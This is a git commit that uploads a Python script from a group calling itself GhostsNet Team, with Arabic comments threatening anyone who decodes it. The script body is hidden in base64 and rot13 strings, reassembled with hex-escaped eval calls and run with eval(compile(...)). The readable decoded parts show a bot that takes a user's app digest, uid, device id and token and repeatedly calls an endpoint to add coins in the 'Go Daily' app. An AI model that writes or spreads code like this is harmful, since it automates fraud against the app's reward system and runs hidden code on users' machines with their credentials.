2d88062c8887c412ce5e71221480f491a779cde6
xorov <97989255+xorov@users.noreply.github.com>
2022-03-07 18:00:03 +0200

    Add files via upload

---
+++ GODAILY_BY_GHOSTSNET TEAM.py
@@ -0,0 +1,16 @@
+# GhostsNet_Team
+
+#الاسكريبت تمت برمجته من اكثر من ادمن في تيم جوستس نت كل الشكر لهم  
+
+#الاسكريبت مجاني لكل من يتابعنا 
+
+#في حالة قيام اي شخص بفك هذا الاسكريبت مثل الاسكريبت السابق سنقوم بتغيير الاكواد لاهانتك 👌☠️✅
+
+import base64, codecs
+magic = 'aW1wb3J0IHJlcXVlc3RzLHRpbWUsc3lzLG9zCmRlcyA9ICIiIlx4MWJbMDszN20gV2VsY29tZSBUbyBTY3JpcHQgR28gRGFpbHkgQXBwIFYyIEJZIEdIT1NUU05FVCBURUFNIiIiCnByaW50KGRlcykKcHJpbnQoIlx4MWJbMDszMW0tIio2MCkKcHJpbnQoKQpEaWdlc3Q9aW5wdXQoIlx4MWJbMDszMm1FbnRlciBZb3VyIERpZ2VzdFx4MWJbMDszNW06ICIpCmlmICd4YnNpZ192MScgaW4gRGlnZXN0OgogICAgRGlnZXN0PURpZ2VzdC5yZXBsYWNlKCd4YnNpZ192MT0nLCcnKQpwcmludCgpCmRhdGEyPXN0cihpbnB1dCgiXHgxYlswOzM2bUVudGVyIFlvdXIgRGF0Y'
+love = 'Ik4ZJWoZQfmZ206VPVcXDcjpzyhqPtcPaIcMQ1coaO1qPtvKUtkLyfjBmZloHIhqTIlVSyiqKVtqJyxKUtkLyfjBmZ2oGbtVvxXpUWcoaDbXDc0o2gyow1coaO1qPtvKUtkLyfjBmZ1oHIhqTIlVSyiqKVtLJAwMKAmK3Ein2IhKUtkLyfjBmZkoGbtVvxXpUWcoaDbXDcxnJD9nJ5jqKDbVyk4ZJWoZQfmZ21SoaEypvOMo3IlVTEcMSk4ZJWoZQfmZz06VPVcPaOlnJ50XPxXo3Zhp3ymqTIgXPqwoTIupvpcPzSxMQ1lMKS1MKA0pl5aMKDbMvqbqUEjpmbiY2SjnJqiMTScoUxhnTIlo2g1LKOjYzAioF8/ETS0LG17MTS0LGW9WyAcM249r0EcM2ImqU0zETyaMKA0CKgRnJ'
+god = 'dlc3R9JnVpZD17dWlkfSZkaWQ9e2RpZH0mdG9rZW49e3Rva2VufScpCmlmICdEb25lIEFkZCBDb2luJyBpbiBhZGQudGV4dDoKICAgIGFkPWFkZC5qc29uKCkKICAgIHByaW50KCJcMDMzWzE7MzJtPSIgKiA1MCkKICAgIHByaW50KGFkKQogICAgcHJpbnQoIlwwMzNbMTszNm09IiAqIDUwKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICBjb3VudCA9IDMwCiAgICAgICAgd2hpbGUgY291bnQgPj0gMDoKICAgICAgICAgICAgcHJpbnQoZiJceDFiWzE7MzNtV2FpdCBGb3Ige2NvdW50fSBTZWNvbmRzIiwgZW5kPSJcciIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMSk'
+destiny = 'XVPNtVPNtVPNtVPNtL291oaDtYG0tZDbtVPNtVPNtVUOlnJ50XPxXVPNtVPNtVPOuMTDlCKWypKIyp3EmYzqyqPuzW2u0qUOmBv8iLKOcM29xLJyfrF5bMKWin3IupUNhL29gYm9RLKEuCKgxLKEuZa0zH2yaow17ETyaMKA0sFMRnJqyp3D9r0EcM2ImqU0zqJyxCKg1nJE9WzEcMQ17MTyxsFM0o2gyow17qT9eMJ59WlxhnaAiovtcPvNtVPNtVPNtpUWcoaDbVyjjZmAoZGfmZz09VvNdVQHjXDbtVPNtVPNtVUOlnJ50XTSxMQVcPvNtVPNtVPNtpUWcoaDbVyjjZmAoZGfmAz09VvNdVQHjXDbtVPNtVPNtVUOlnJ50XPxXMJkmMGbXVPNtVUOlnJ50XTSxMP50MKu0XD=='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
